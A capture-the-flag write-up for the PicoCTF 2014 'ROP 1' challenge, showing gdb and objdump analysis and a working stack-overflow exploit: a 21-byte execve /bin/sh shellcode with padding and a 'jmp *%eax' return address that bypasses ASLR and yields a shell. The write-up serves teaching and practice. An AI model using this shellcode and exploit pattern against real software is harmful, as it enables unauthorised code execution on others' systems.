# Pico CTF 2014 : ROP 1

**Category:** Binary Exploitation
**Points:** 100
**Description:**

>This binary is running on a machine with ASLR! Can you bypass it? The binary can be found at /home/rop1/ on the shell server. The source can be found [here](rop1.c).

**Hint:**
>ASLR is hard to beat if you need to predict an address, but what if you don't? What does %eax contain when vuln returns? Is there any code in the program which calls or jumps to it?

## Write-up

The hint asks a very important question, so let's find out in gdb!
```
/home/rop1$ gdb -q ./rop1
Reading symbols from ./rop1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048e87 <+0>: push   %ebp
   0x08048e88 <+1>: mov    %esp,%ebp
   0x08048e8a <+3>: and    $0xfffffff0,%esp
   0x08048e8d <+6>: sub    $0x10,%esp
   0x08048e90 <+9>: call   0x8048e44 <be_nice_to_people>
   0x08048e95 <+14>:    cmpl   $0x1,0x8(%ebp)
   0x08048e99 <+18>:    jle    0x8048eab <main+36>
   0x08048e9b <+20>:    mov    0xc(%ebp),%eax
   0x08048e9e <+23>:    add    $0x4,%eax
   0x08048ea1 <+26>:    mov    (%eax),%eax
   0x08048ea3 <+28>:    mov    %eax,(%esp)
   0x08048ea6 <+31>:    call   0x8048e6d <vuln>
   0x08048eab <+36>:    mov    $0x0,%eax
   0x08048eb0 <+41>:    leave
   0x08048eb1 <+42>:    ret
End of assembler dump.
(gdb) b*main+36
Breakpoint 1 at 0x8048eab
(gdb) set arg ASDF
(gdb) r
Starting program: /home/rop1/rop1 ASDF

Breakpoint 1, 0x08048eab in main ()
(gdb) info register eax
eax            0xffffd690   -10608
(gdb) x /s 0xffffd690
0xffffd690: "ASDF"
(gdb) quit
```

If you're confused by this part, here's the breakdown. We set the program to
take "ASDF" as input. We then printed out what was at the address stored in 
`%eax` right after `vuln()` returns control to `main()`. Surely enough, it
points to our buffer! This will hold true for every run of the program despite
ASLR. The second part of the hint suggests that there is code that will jump to
`%eax`, meaning we can supply shellcode and call it!
```
/home/rop1$ objdump -d rop1 | grep jmp | grep eax
...
809ef72:   ff e0                   jmp    *%eax
80ab052:   ff e0                   jmp    *%eax
80b5399:   ff e0                   jmp    *%eax
80ba07b:   ff e0                   jmp    *%eax
80ba180:   ff e0                   jmp    *%eax
80ba960:   ff e0                   jmp    *%eax
80bae38:   ff e0                   jmp    *%eax
80bbf99:   ff e0                   jmp    *%eax
```
As you can see, there are several addresses that contain what we need! I'll
just take the bottom one and use it.

```
./rop1 $(python -c 'print "A"\*76 + "BBBB"')
```
We control `%eip` after 76 bytes, we just have to replace the "B"s with
0x80bbf99 and put shellcode in the first part of our buffer.
```
./rop1 $(python -c 'print
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+ "A"*(76-21) + "\x99\xbf\x0b\x08"')
$ ls
Makefile  flag.txt  rop1  rop1.c
$ cat flag.txt
theres_no_need_to_guess
```
The reason I have (76-21) in there is because you need to keep your padding
length the same, so I took 76 bytes minus the lenth of the shellcode, which is
21 bytes.
## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/rop_1.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-rop1/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/rop1>
